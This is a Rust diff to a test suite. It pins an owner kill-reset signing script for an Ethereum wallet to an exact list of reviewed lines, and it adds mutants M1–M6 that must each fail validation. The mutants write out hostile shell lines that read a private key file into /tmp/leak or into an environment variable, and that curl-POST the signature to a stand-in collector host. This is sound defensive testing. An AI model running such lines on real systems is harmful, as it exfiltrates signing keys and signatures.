@@ -173,34 +173,81 @@ fn dependency_features() -> BTreeMap<&'static str, (&'static [&'static str], boo
     ])
 }
 
-fn validate_owner_script_process_arguments(script: &str) -> Result<(), String> {
-    let mut commands = Vec::new();
-    for (line_index, line) in script.lines().enumerate() {
-        let sensitive_wallet_command =
-            line.contains("wallet address") || line.contains("wallet sign");
-        let Some(start) = line.find("cast wallet ") else {
-            if sensitive_wallet_command {
-                return Err(format!("indirect wallet command on line {}", line_index + 1));
-            }
-            continue;
-        };
-        let invocation = &line[start..];
-        if invocation["cast wallet ".len()..].contains("cast wallet ") {
-            return Err(format!("multiple cast wallet commands on line {}", line_index + 1));
-        }
-        let end = invocation.find(')').unwrap_or(invocation.len());
-        commands.push(
-            invocation[..end].split_ascii_whitespace().map(str::to_owned).collect::<Vec<_>>(),
-        );
+const OWNER_SCRIPT_EXECUTABLE_LINES: &[&str] = &[
+    "set -euo pipefail",
+    r#"export PATH="$HOME/.foundry/bin:$PATH""#,
+    r#"if [ "$#" -ne 2 ]; then"#,
+    r#"echo "usage: $0 <engagement_epoch> <nonce>" >&2"#,
+    "exit 2",
+    "fi",
+    r#"EPOCH="$1""#,
+    r#"NONCE="$2""#,
+    r#"if ! [[ "$EPOCH" =~ ^[0-9]+$ && "$NONCE" =~ ^[0-9]+$ ]]; then"#,
+    r#"echo "engagement_epoch and nonce must be unsigned decimal integers" >&2"#,
+    "exit 2",
+    "fi",
+    r#"ROOT_DIR="$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")/.." && pwd)""#,
+    r#"RESET_CONTEXT="$("#,
+    "cargo run --quiet --manifest-path \"$ROOT_DIR/Cargo.toml\" \\",
+    r#"-p base-kill-reset-bin -- --prepare "$EPOCH" "$NONCE""#,
+    r#")""#,
+    r#"mapfile -t RESET_LINES <<< "$RESET_CONTEXT""#,
+    r#"if [ "${#RESET_LINES[@]}" -ne 2 ]; then"#,
+    r#"echo "kill-reset binary returned an invalid preparation response" >&2"#,
+    "exit 1",
+    "fi",
+    r#"MSG="${RESET_LINES[0]}""#,
+    r#"EXPECT_ADDR="${RESET_LINES[1]}""#,
+    r#"echo "  message: $MSG""#,
+    r#"echo "== [1/3] derive and compare owner address ==""#,
+    r#"GOT_ADDR="$(cast wallet address --interactive)""#,
+    r#"echo "  derived: $GOT_ADDR""#,
+    r#"echo "  expect : $EXPECT_ADDR""#,
+    r#"if [ "${GOT_ADDR,,}" != "${EXPECT_ADDR,,}" ]; then"#,
+    r#"echo "  owner address mismatch; aborting" >&2"#,
+    "exit 1",
+    "fi",
+    r#"echo "== [2/3] sign ==""#,
+    r#"SIG="$(cast wallet sign --interactive "$MSG")""#,
+    r#"echo "== [3/3] verify ==""#,
+    r#"cast wallet verify --address "$EXPECT_ADDR" "$MSG" "$SIG""#,
+    r#"SIG_HEX="${SIG#0x}""#,
+    r#"if ! [[ "$SIG_HEX" =~ ^[0-9a-f]{130}$ ]]; then"#,
+    r#"echo "cast returned a non-canonical signature; aborting" >&2"#,
+    "exit 1",
+    "fi",
+    r#"echo """#,
+    r#"echo "================ KILL-RESET SIGNATURE ================""#,
+    r#"echo "$SIG_HEX""#,
+    r#"echo "======================================================""#,
+];
+
+fn validate_owner_script_program(script: &str) -> Result<(), String> {
+    let executable_lines = script
+        .lines()
+        .enumerate()
+        .filter_map(|(line_index, line)| {
+            let line = line.trim();
+            (!line.is_empty() && !line.starts_with('#')).then_some((line_index + 1, line))
+        })
+        .collect::<Vec<_>>();
+
+    if executable_lines.len() != OWNER_SCRIPT_EXECUTABLE_LINES.len() {
+        return Err(format!(
+            "owner script executable-line count changed: expected {}, got {}",
+            OWNER_SCRIPT_EXECUTABLE_LINES.len(),
+            executable_lines.len()
+        ));
     }
 
-    let expected = [
-        vec!["cast", "wallet", "address", "--interactive"],
-        vec!["cast", "wallet", "sign", "--interactive", "\"$MSG\""],
-        vec!["cast", "wallet", "verify", "--address", "\"$EXPECT_ADDR\"", "\"$MSG\"", "\"$SIG\""],
-    ];
-    if commands != expected {
-        return Err(format!("cast wallet argv shape changed: {commands:?}"));
+    for ((line_number, actual), expected) in
+        executable_lines.iter().zip(OWNER_SCRIPT_EXECUTABLE_LINES)
+    {
+        if actual != expected {
+            return Err(format!(
+                "unclassified owner-script line {line_number}: expected {expected:?}, got {actual:?}"
+            ));
+        }
     }
     Ok(())
 }
@@ -208,6 +255,13 @@ fn validate_owner_script_process_arguments(script: &str) -> Result<(), String> {
 fn replace_once(source: &str, from: &str, to: &str) -> String {
     assert_eq!(source.matches(from).count(), 1, "mutant source must have one match");
     source.replacen(from, to, 1)
+}
+
+fn assert_owner_script_mutant_red(name: &str, mutant: &str) {
+    match validate_owner_script_program(mutant) {
+        Ok(()) => panic!("{name} unexpectedly green"),
+        Err(error) => eprintln!("{name}: RED ({error})"),
+    }
 }
 
 #[test]
@@ -353,25 +407,72 @@ fn every_workspace_binary_linking_trader_is_dependency_and_source_sealed() {
 }
 
 #[test]
-fn owner_kill_reset_script_pins_process_argument_property_with_mutants() {
+fn owner_kill_reset_script_is_fail_closed_with_m1_through_m6_mutants() {
     let script = fs::read_to_string(workspace_root().join("scripts/owner-kill-reset-sign.sh"))
         .expect("owner kill-reset script");
-    validate_owner_script_process_arguments(&script).expect("reviewed argv shape");
+    validate_owner_script_program(&script).expect("reviewed owner-script program");
 
-    let positional =
-        replace_once(&script, "cast wallet address --interactive", "cast wallet address \"$K\"");
-    assert!(validate_owner_script_process_arguments(&positional).is_err());
-
-    let short_interactive =
-        replace_once(&script, "cast wallet address --interactive", "cast wallet address -i");
-    assert!(validate_owner_script_process_arguments(&short_interactive).is_err());
-
-    let read_and_interpolate = replace_once(
+    let prepare_block = r#"ROOT_DIR="$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")/.." && pwd)"
+RESET_CONTEXT="$(
+  cargo run --quiet --manifest-path "$ROOT_DIR/Cargo.toml" \
+    -p base-kill-reset-bin -- --prepare "$EPOCH" "$NONCE"
+)"
+mapfile -t RESET_LINES <<< "$RESET_CONTEXT"
+if [ "${#RESET_LINES[@]}" -ne 2 ]; then
+  echo "kill-reset binary returned an invalid preparation response" >&2
+  exit 1
+fi
+MSG="${RESET_LINES[0]}"
+EXPECT_ADDR="${RESET_LINES[1]}"
+echo "  message: $MSG""#;
+    let m1 = replace_once(
         &script,
-        "GOT_ADDR=\"$(cast wallet address --interactive)\"",
-        "K=\"$(cat \"$HOME/.config/mev-owner-attest/attest.key\")\"\nGOT_ADDR=\"$(cast wallet address --interactive \"$K\")\"",
+        prepare_block,
+        r#"MSG="base-mev:p2-killreset:$EPOCH:$NONCE"
+EXPECT_ADDR="0x581F5c5EC1d63BA08d6024E8b1cF88b83D57285b""#,
     );
-    assert!(validate_owner_script_process_arguments(&read_and_interpolate).is_err());
+    assert!(!m1.contains("base-kill-reset-bin"), "M1 instrument did not remove binary source");
+    assert_owner_script_mutant_red("M1", &m1);
+
+    let m2 = replace_once(
+        &script,
+        r#"echo "  message: $MSG""#,
+        r#"KEYMAT="$(cat "$HOME/.config/mev-owner-attest/attest.key")"
+printf '%s\n' "$KEYMAT" > /tmp/leak
+echo "  message: $MSG""#,
+    );
+    assert_owner_script_mutant_red("M2", &m2);
+
+    let m3 = replace_once(
+        &script,
+        r#"GOT_ADDR="$(cast wallet address --interactive)""#,
+        r#"export ETH_PRIVATE_KEY="$(cat "$HOME/.config/mev-owner-attest/attest.key")"
+GOT_ADDR="$(cast wallet address --interactive)""#,
+    );
+    assert_owner_script_mutant_red("M3", &m3);
+
+    let m4 = replace_once(
+        &script,
+        r#"SIG_HEX="${SIG#0x}""#,
+        r#"SIG_HEX="${SIG#0x}"
+curl -X POST -d "$SIG_HEX" https://example.invalid/collect"#,
+    );
+    assert_owner_script_mutant_red("M4", &m4);
+
+    let m5 =
+        replace_once(&script, "cast wallet address --interactive", "cast wallet address \"$K\"");
+    assert_owner_script_mutant_red("M5", &m5);
+
+    let address_gate = r#"echo "== [1/3] derive and compare owner address =="
+GOT_ADDR="$(cast wallet address --interactive)"
+echo "  derived: $GOT_ADDR"
+echo "  expect : $EXPECT_ADDR"
+if [ "${GOT_ADDR,,}" != "${EXPECT_ADDR,,}" ]; then
+  echo "  owner address mismatch; aborting" >&2
+  exit 1
+fi"#;
+    let m6 = replace_once(&script, address_gate, "");
+    assert_owner_script_mutant_red("M6", &m6);
 }
 
 #[test]
